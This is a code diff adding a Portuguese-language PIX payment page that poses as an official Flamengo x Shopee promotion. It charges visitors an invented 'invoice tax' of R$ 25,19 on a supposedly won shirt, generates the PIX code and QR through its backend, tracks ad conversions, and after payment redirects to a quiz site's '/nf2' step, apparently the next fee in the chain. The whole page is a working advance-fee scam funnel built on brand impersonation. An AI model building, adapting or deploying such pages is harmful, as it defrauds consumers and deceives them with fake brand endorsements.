@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento PIX - Flamengo x Shopee</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/webp" href="/images/flamengo-logo.webp">
+    
+    <!-- UTMify Pixel -->
+    <script>
+      window.pixelId = "678f8dea8a389097ee008320";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+    
+    <!-- QRCode Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        background: linear-gradient(135deg, #8B0000 0%, #5C0000 50%, #2D0000 100%);
+        min-height: 100vh;
+        -webkit-font-smoothing: antialiased;
+      }
+
+      .header {
+        background: linear-gradient(90deg, #EE4D2D 0%, #FF6633 100%);
+        padding: 12px 20px;
+        position: sticky;
+        top: 0;
+        z-index: 100;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+      }
+
+      .header-content {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        max-width: 600px;
+        margin: 0 auto;
+      }
+
+      .logo-container {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .logo-flamengo {
+        height: 32px;
+        width: auto;
+      }
+
+      .logo-shopee {
+        height: 28px;
+        width: auto;
+      }
+
+      .header-title {
+        color: white;
+        font-size: 16px;
+        font-weight: 700;
+      }
+
+      .x-mark {
+        color: #FFD700;
+        font-weight: 800;
+      }
+
+      .container {
+        max-width: 500px;
+        margin: 0 auto;
+        padding: 20px 16px 40px;
+      }
+
+      .main-card {
+        background: white;
+        border-radius: 16px;
+        padding: 24px 20px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      }
+
+      .loading-container {
+        text-align: center;
+        padding: 40px 20px;
+      }
+
+      .spinner {
+        width: 50px;
+        height: 50px;
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #EE4D2D;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 20px;
+      }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+      .loading-text {
+        color: #666;
+        font-size: 16px;
+      }
+
+      .success-badge {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        background: linear-gradient(90deg, #10B981 0%, #059669 100%);
+        color: white;
+        padding: 12px 20px;
+        border-radius: 8px;
+        font-weight: 600;
+        font-size: 14px;
+        margin-bottom: 20px;
+      }
+
+      .success-badge svg {
+        width: 20px;
+        height: 20px;
+      }
+
+      .instruction-text {
+        text-align: center;
+        color: #666;
+        font-size: 14px;
+        margin-bottom: 20px;
+        line-height: 1.5;
+      }
+
+      .qr-container {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 20px;
+      }
+
+      #qrcode {
+        background: white;
+        padding: 16px;
+        border-radius: 12px;
+        border: 2px solid #E5E5E5;
+      }
+
+      #qrcode canvas {
+        display: block;
+      }
+
+      .pix-code-container {
+        margin-bottom: 20px;
+      }
+
+      .pix-code-label {
+        font-size: 12px;
+        color: #666;
+        margin-bottom: 8px;
+        text-align: center;
+      }
+
+      .pix-code-wrapper {
+        display: flex;
+        gap: 8px;
+      }
+
+      .pix-code-input {
+        flex: 1;
+        padding: 12px;
+        border: 1px solid #E5E5E5;
+        border-radius: 8px;
+        font-size: 12px;
+        background: #F9F9F9;
+        color: #333;
+      }
+
+      .copy-button {
+        padding: 12px 20px;
+        background: linear-gradient(90deg, #10B981 0%, #059669 100%);
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+      }
+
+      .copy-button:hover {
+        transform: translateY(-2px);
+      }
+
+      .copy-button svg {
+        width: 16px;
+        height: 16px;
+      }
+
+      .order-summary {
+        background: #F9F9F9;
+        border-radius: 12px;
+        padding: 16px;
+        margin-bottom: 20px;
+      }
+
+      .order-summary h3 {
+        font-size: 14px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 12px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .order-summary h3 svg {
+        width: 18px;
+        height: 18px;
+        color: #EE4D2D;
+      }
+
+      .order-row {
+        display: flex;
+        justify-content: space-between;
+        padding: 8px 0;
+        border-bottom: 1px dashed #E5E5E5;
+        font-size: 14px;
+      }
+
+      .order-row:last-child {
+        border-bottom: none;
+      }
+
+      .order-row.total {
+        font-weight: 700;
+        color: #C81E1E;
+        font-size: 16px;
+        padding-top: 12px;
+        margin-top: 8px;
+        border-top: 2px solid #E5E5E5;
+      }
+
+      .how-to-pay {
+        background: #FFF7ED;
+        border-radius: 12px;
+        padding: 16px;
+        margin-bottom: 20px;
+      }
+
+      .how-to-pay h3 {
+        font-size: 14px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 12px;
+      }
+
+      .how-to-pay ol {
+        padding-left: 20px;
+        font-size: 13px;
+        color: #666;
+        line-height: 1.8;
+      }
+
+      .status-waiting {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        background: #FEF3C7;
+        color: #92400E;
+        padding: 12px;
+        border-radius: 8px;
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .status-waiting svg {
+        width: 18px;
+        height: 18px;
+        animation: pulse 2s infinite;
+      }
+
+      @keyframes pulse {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.5; }
+      }
+
+      .status-paid {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        background: #D1FAE5;
+        color: #065F46;
+        padding: 24px;
+        border-radius: 12px;
+        text-align: center;
+      }
+
+      .status-paid svg {
+        width: 48px;
+        height: 48px;
+        color: #10B981;
+      }
+
+      .status-paid h2 {
+        font-size: 20px;
+        font-weight: 700;
+      }
+
+      .status-paid p {
+        font-size: 14px;
+        opacity: 0.8;
+      }
+
+      .error-container {
+        text-align: center;
+        padding: 40px 20px;
+        color: #DC2626;
+      }
+
+      .error-container svg {
+        width: 48px;
+        height: 48px;
+        margin-bottom: 16px;
+      }
+
+      .error-container p {
+        font-size: 14px;
+        margin-bottom: 16px;
+      }
+
+      .retry-button {
+        padding: 12px 24px;
+        background: #EE4D2D;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+
+      .hidden {
+        display: none !important;
+      }
+
+      .footer {
+        text-align: center;
+        margin-top: 24px;
+        color: rgba(255, 255, 255, 0.8);
+      }
+
+      .footer p {
+        font-size: 12px;
+      }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo-container">
+                <img src="/images/flamengo-logo.webp" alt="Flamengo" class="logo-flamengo">
+                <img src="/images/logo-fla-shopee.png" alt="Shopee" class="logo-shopee">
+            </div>
+            <span class="header-title">Shopee <span class="x-mark">X</span> FLAMENGO</span>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="main-card">
+            <!-- Loading State -->
+            <div id="loadingState" class="loading-container">
+                <div class="spinner"></div>
+                <p class="loading-text">Gerando código PIX...</p>
+                <p style="font-size: 13px; color: #999; margin-top: 8px;">Taxa de Nota Fiscal</p>
+            </div>
+
+            <!-- Payment State -->
+            <div id="paymentState" class="hidden">
+                <!-- Success Badge -->
+                <div class="success-badge">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                    </svg>
+                    <span>PIX gerado com sucesso!</span>
+                </div>
+
+                <!-- Instruction -->
+                <p class="instruction-text">
+                    Copie o código ou use a câmera para ler o QR Code e realize o pagamento no app do seu banco.
+                </p>
+
+                <!-- QR Code -->
+                <div class="qr-container">
+                    <div id="qrcode"></div>
+                </div>
+
+                <!-- PIX Code -->
+                <div class="pix-code-container">
+                    <p class="pix-code-label">Código PIX Copia e Cola</p>
+                    <div class="pix-code-wrapper">
+                        <input type="text" id="pixCode" class="pix-code-input" readonly>
+                        <button id="copyButton" class="copy-button">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            <span id="copyText">Copiar</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Order Summary -->
+                <div class="order-summary">
+                    <h3>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                            <polyline points="14 2 14 8 20 8"></polyline>
+                        </svg>
+                        Resumo do Pedido
+                    </h3>
+                    <div class="order-row">
+                        <span>Item</span>
+                        <span>Taxa de Nota Fiscal</span>
+                    </div>
+                    <div class="order-row">
+                        <span>Valor da camiseta</span>
+                        <span>R$ 359,90</span>
+                    </div>
+                    <div class="order-row">
+                        <span>Alíquota ICMS + ISS</span>
+                        <span>7%</span>
+                    </div>
+                    <div class="order-row total">
+                        <span>Total a Pagar</span>
+                        <span>R$ 25,19</span>
+                    </div>
+                </div>
+
+                <!-- How to Pay -->
+                <div class="how-to-pay">
+                    <h3>📱 Como pagar com PIX</h3>
+                    <ol>
+                        <li>Abra o app do seu banco</li>
+                        <li>Escolha pagar com PIX</li>
+                        <li>Escaneie o QR Code ou cole o código</li>
+                        <li>Confirme o pagamento</li>
+                    </ol>
+                </div>
+
+                <!-- Status -->
+                <div id="statusWaiting" class="status-waiting">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <polyline points="12 6 12 12 16 14"></polyline>
+                    </svg>
+                    <span>Aguardando pagamento...</span>
+                </div>
+            </div>
+
+            <!-- Paid State -->
+            <div id="paidState" class="hidden">
+                <div class="status-paid">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                    </svg>
+                    <h2>Pagamento Confirmado!</h2>
+                    <p>Sua nota fiscal será emitida em breve.</p>
+                    <p style="font-size: 12px; margin-top: 8px;">Redirecionando...</p>
+                </div>
+            </div>
+
+            <!-- Error State -->
+            <div id="errorState" class="hidden error-container">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="15" y1="9" x2="9" y2="15"></line>
+                    <line x1="9" y1="9" x2="15" y2="15"></line>
+                </svg>
+                <p id="errorMessage">Erro ao gerar PIX</p>
+                <button class="retry-button" onclick="location.reload()">Tentar Novamente</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>Promoção oficial Flamengo x Shopee</p>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = window.location.origin;
+        const TAX_VALUE = 25.19;
+        
+        let transactionId = null;
+        let checkInterval = null;
+
+        // Get UTM params from URL
+        function getUTMParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const utmParams = {};
+            ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'src', 'sck'].forEach(param => {
+                if (urlParams.has(param)) {
+                    utmParams[param] = urlParams.get(param);
+                }
+            });
+            return utmParams;
+        }
+
+        // Generate random order ID
+        function generateOrderId() {
+            return 'NF1-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
+        }
+
+        // Create PIX transaction
+        async function createPixTransaction() {
+            const orderId = generateOrderId();
+            const utm = getUTMParams();
+
+            try {
+                const response = await fetch(`${API_BASE}/api/trpc/payment.createPixSimple`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        json: {
+                            amount: TAX_VALUE,
+                            description: 'Taxa de Nota Fiscal - Camiseta Flamengo',
+                            utm: utm
+                        }
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.result?.data?.json?.success) {
+                    const result = data.result.data.json;
+                    transactionId = result.transactionId;
+                    
+                    // Show payment state
+                    document.getElementById('loadingState').classList.add('hidden');
+                    document.getElementById('paymentState').classList.remove('hidden');
+                    
+                    // Generate QR Code
+                    const qrcodeContainer = document.getElementById('qrcode');
+                    qrcodeContainer.innerHTML = ''; // Clear any existing content
+                    new QRCode(qrcodeContainer, {
+                        text: result.pixCode,
+                        width: 200,
+                        height: 200,
+                        colorDark: '#000000',
+                        colorLight: '#ffffff',
+                        correctLevel: QRCode.CorrectLevel.H
+                    });
+                    
+                    // Set PIX code
+                    document.getElementById('pixCode').value = result.pixCode;
+                    
+                    // Start checking payment status
+                    startStatusCheck();
+                } else {
+                    throw new Error(data.result?.data?.json?.error || 'Erro ao criar transação');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('loadingState').classList.add('hidden');
+                document.getElementById('errorState').classList.remove('hidden');
+                document.getElementById('errorMessage').textContent = error.message || 'Erro ao gerar PIX';
+            }
+        }
+
+        // Check payment status
+        async function checkPaymentStatus() {
+            if (!transactionId) return;
+
+            try {
+                const response = await fetch(`${API_BASE}/api/trpc/payment.checkStatus?input=${encodeURIComponent(JSON.stringify({ json: { transactionId: transactionId } }))}`);
+                const data = await response.json();
+                
+                if (data.result?.data?.json?.isPaid) {
+                    clearInterval(checkInterval);
+                    
+                    // Show paid state
+                    document.getElementById('paymentState').classList.add('hidden');
+                    document.getElementById('paidState').classList.remove('hidden');
+                    
+                    // Send conversion to UTMify
+                    sendConversion();
+                    
+                    // Redirect after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = 'https://flamengo-quiz-production.up.railway.app/nf2';
+                    }, 2000);
+                }
+            } catch (error) {
+                console.error('Status check error:', error);
+            }
+        }
+
+        // Send conversion to UTMify
+        async function sendConversion() {
+            const utm = getUTMParams();
+            
+            try {
+                await fetch(`${API_BASE}/api/trpc/payment.sendConversion`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        json: {
+                            orderId: 'NF1-' + transactionId,
+                            transactionId: transactionId,
+                            amount: TAX_VALUE,
+                            customer: {
+                                name: 'Cliente NF1',
+                                email: 'cliente@nf1.com',
+                                phone: '11999999999',
+                                cpf: '12345678901'
+                            },
+                            product: {
+                                name: 'Taxa de Nota Fiscal',
+                                price: TAX_VALUE,
+                                quantity: 1
+                            },
+                            utm: utm,
+                            paymentMethod: 'pix'
+                        }
+                    })
+                });
+            } catch (error) {
+                console.error('Conversion error:', error);
+            }
+        }
+
+        // Start status check interval
+        function startStatusCheck() {
+            checkInterval = setInterval(checkPaymentStatus, 5000);
+        }
+
+        // Copy PIX code
+        document.getElementById('copyButton').addEventListener('click', function() {
+            const pixCode = document.getElementById('pixCode');
+            pixCode.select();
+            document.execCommand('copy');
+            
+            const copyText = document.getElementById('copyText');
+            copyText.textContent = 'Copiado!';
+            setTimeout(() => {
+                copyText.textContent = 'Copiar';
+            }, 3000);
+        });
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            createPixTransaction();
+        });
+    </script>
+</body>
+</html>
